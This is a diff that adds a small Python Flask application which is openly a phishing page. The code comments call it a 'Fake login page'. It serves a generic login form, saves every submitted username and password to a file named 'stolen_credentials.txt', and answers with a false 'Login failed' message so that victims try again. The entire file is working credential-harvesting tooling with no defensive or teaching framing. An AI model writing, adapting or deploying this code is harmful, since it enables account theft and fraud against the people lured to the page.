@@ -1,0 +1,31 @@
+from flask import Flask, request
+
+app = Flask(__name__)
+
+# Fake login page
+@app.route("/", methods=["GET", "POST"])
+def login():
+    if request.method == "POST":
+        username = request.form.get("username")
+        password = request.form.get("password")
+        with open("stolen_credentials.txt", "a") as f:
+            f.write(f"Username: {username}, Password: {password}\n")
+        return "Login failed. Please try again."
+    return '''
+    <html>
+    <head>
+        <title>Login</title>
+    </head>
+    <body>
+        <h1>Login to Your Account</h1>
+        <form method="post">
+            <input type="text" name="username" placeholder="Username" required/><br>
+            <input type="password" name="password" placeholder="Password" required/><br>
+            <button type="submit">Login</button>
+        </form>
+    </body>
+    </html>
+    '''
+
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=8080)
